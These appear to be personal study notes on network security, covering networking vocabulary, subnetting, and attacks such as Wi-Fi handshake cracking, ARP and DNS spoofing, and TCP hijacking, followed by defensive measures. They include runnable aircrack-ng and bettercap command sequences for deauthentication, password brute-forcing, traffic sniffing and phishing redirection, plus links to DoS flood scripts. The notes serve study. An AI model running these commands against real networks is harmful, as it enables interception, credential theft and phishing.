# Vocabulary

`TxPower` wifi power -> used to set range to avoid neighbors getting your wifi

`MAC address` physical address stored in a network card

`HyperText Transfer Protocol [HTTP]` data transfer protocol on the web

`Address Resolution Protocol [ARP]` associate local IP address to MAC address

`Domain Name System` get IP address of server corresponding to a URL or other address type

`DNS poisoning` alter DNS records to redirect user to an attacker controlled website

`TCP` secure connection making sure all data passed through

`UDP` no check that data was properly sent

`Transport Layer Security` exchange safety protocol located on the layer above TCP and UDP

`Secure Sockets Layer` old TLS

`Wi-Fi Protected Access` Wi-Fi security protocol

`Sock(et)s` protocol for apps behind firewall to request access to an external server

`Network Address Translation` map IP addresses to one another 

`Internet Control Message Protocol` network layer protocol used by network devices to diagnose network communication issues, used to determine whether or not data is reaching its intended destination in a timely manner

![](img/2023-08-29-18-07-02.png)

# IP routing

Subnet mask divides the IP address into a network address and host address, hence to identify which part of IP address is reserved for the network and which part is available for host use

Each subnet has 2 reserved adresses: 
- one for the network address
- one for the diffusion address (last one)

| Network Mask | Shorthand |
| - | - |
| 255.0.0.0 | /8 |
| 255.255.0.0 |	/16 |
| 255.255.255.0 | /24 |
| 255.255.255.128 | /25 |
| 255.255.255.192 | /26 |
| 255.255.255.224 | /27 |
| 255.255.255.240 | /28 |
| 255.255.255.248 | /29 |
| 255.255.255.252 | /30 |
| 255.255.255.254 | /31 |
| 255.255.255.255 | /32 |

# Wifi hacking

`Wi-Fi Protected Setup [WPS]` unsafe protocol to easily connect any device to a Wi-Fi network with an 8-digit PIN

> **Vulnerability**: `Pixie Dust` Last 4 digits are only checked if the first 4 are correct -> need to brute-force 2 * 4 digits instead of 8

`Pairwise Master Key [PMK]` hash of password + router id

`PMKID` hash of PMK + PMK id -> can get it directly from Access Point to avoid intercepting EAPOL connection data

## Wifite

Main tool to automate all attacks described above

Wifite decomposed:
```bash 
# list wifi interfaces
ifconfig

# enable monitoring mode
airmon-ng start <interface_name>

# check monitoring mode
iwconfig

# kill conflicting processes
airmon-ng check kill

# list all available networks
airodump-ng <interface_name>

# dump all traffic from a router to a capture file

airodump-ng --bssid <router_mac_address> --channel <channel_number_from_airodump-ng> --write <capture_file_name> <interface_name>

# deauthenticate network devices to intercept reconnection data (run in parallel)
aireplay-ng --deauth <deauth_count> -a <router_mac_address> <interface_name>

# brute force password
aircrack-ng <capture_file_name> -w <wordlist_file_name>
```

Alternative software: `Bettercap`

## Collecting data on network hosts

`nmap` identify device
```bash
nmap -A <local_ip>
```

[Device company identifier](https://www.ipchecktool.com/tool/macfinder?oui=C8%3A69%3ACD%3A29%3A33%3Af0&page=1)

# ARP spoofing

`ARP poisoning` MITM on network using ARP 

```bash
# setup bettercap to accept all traffic through <interface_name>
sudo iptables -A FORWARD -i <interface_name> -j ACCEPT
sudo iptables -A FORWARD -o <interface_name> -j ACCEPT

# start bettercap
bettercap (-iface <interface_name>)

# send dummy packets to every host on the network to detect them
net.probe on

# list all network hosts
net.show

# activate man-in-the-middle position
set arp.spoof.fullduplex true

# define arp spoofing targets
set arp.spoof.targets <target_ip>

# activate arp spoofing
arp.spoof on

# start intercepting network packets
net.sniff on
```

Alternative software: `arpspoof` command, `ettercap`
```bash
# start ettercap in GUI mode
sudo ettercap -G
```

# DNS spoofing

`DNS poisoning` alter DNS records in the DNS server to redirect user to an attacker controlled website

```bash
# same setup as described in arp spoofing

# reply to all requests
set dns.spoof.all true

# define target website
set dns.spoof.domains <website_url>

# define fake website IP
set dns.spoof.address <phishing_ip>

# activate dns spoofing
dns.spoof on

```

Alternative software: `Ettercap` caplets to update request header

# BGP spoofing

`Border Gateway Protocol [BGP]` BGP is responsible for choosing the route with the lowest cost to a server once DNS address has been resolved. It constructs the routing tables between Autonomous Systems (AS) with independent routing domains:
- Routers maintain tables of (IP subnet → Router IP, cost)
→ no integrity nor authenticity
- Routes change (faults, new contracts, new cables) so BGP updates constantly

Recommended tool: `HoneyPot`

# TCP hijacking

![](img/2023-08-29-18-14-39.png)
![](img/2023-08-29-18-25-29.png)
![](img/2023-08-29-18-22-05.png)
![](img/2023-08-29-18-24-19.png)

1. Wait for TCP session to be established between client and server.
2. Wait for authentication phase to be over
3. Use knowledge of seq number to take over the session and inject malicious traffic
4. Use malicious traffic to execute commands
5. The genuine connection gets cancelled (desynchronized or reset)

# Denial of Service [DoS]

`Denial of Service` Prohibit service use by overwhelming it

[Go script](https://github.com/Leeon123/golang-httpflood)  
[Python script](https://github.com/mach1el/pyddos)

# Firewalls

A firewall is a network router, that connects and internal network to an external public network.
The goal is to mediate the traffic, and make access control decisions based on policy.

# Protections

`Network segmentation` Break down the network based on system and data classification or into functional zones
- Access from zone to zone can be managed by access control list (ACLs) in router or firewalls
- Prevents all-at-once compromise of facilities
- Protects the data center form external threats
- Containment zones aims at stpopping attacks from spreading between zones

`Demilitarized Zone [DMZ]`
- A physical or logical subnet that contains and exposes an organization’s external-facing services to an auntrusted network
- An external network node can access only what is exposed in the DMZ

`Zero trust network`
- Do note trust anybody, not even internal machines
- More work for configuring machines
- Less work on configuring the network
- Greatly reduces the impact if on machine is compromised

`Virtual private network`
- Encryption and encapsulation keep the network private
- Before a packet is sent over the public network, it is encrypted and encapsulated with and IP header with the public address
- Let remote workers access the internal company network
- Interconnecting remotes sites for a company

`Firewalls`
- Enforce network level access control
- Firewalls operate at the network layer
- Firewalls should aussi be present within the network
- Principle of default deny

`Proxies`
- They operate at the application level
- `(Direct) proxies` between the client and internet
	- Protect our users when they access servers on the internet
- `Reverse proxies` between internet and the server
	- Protect our servers when accessed by users from the Internet
- `Web proxies` protect users by
	- Analyzing all data downloaded from the web with anti-virus software
	- Blocking access to dangerous sites

`Web application firewall (WAF)`
- It stands in front of your web server and receives the requests from the internet
- It analyses the request, and if it deems them safe, it forwards thel to the real server
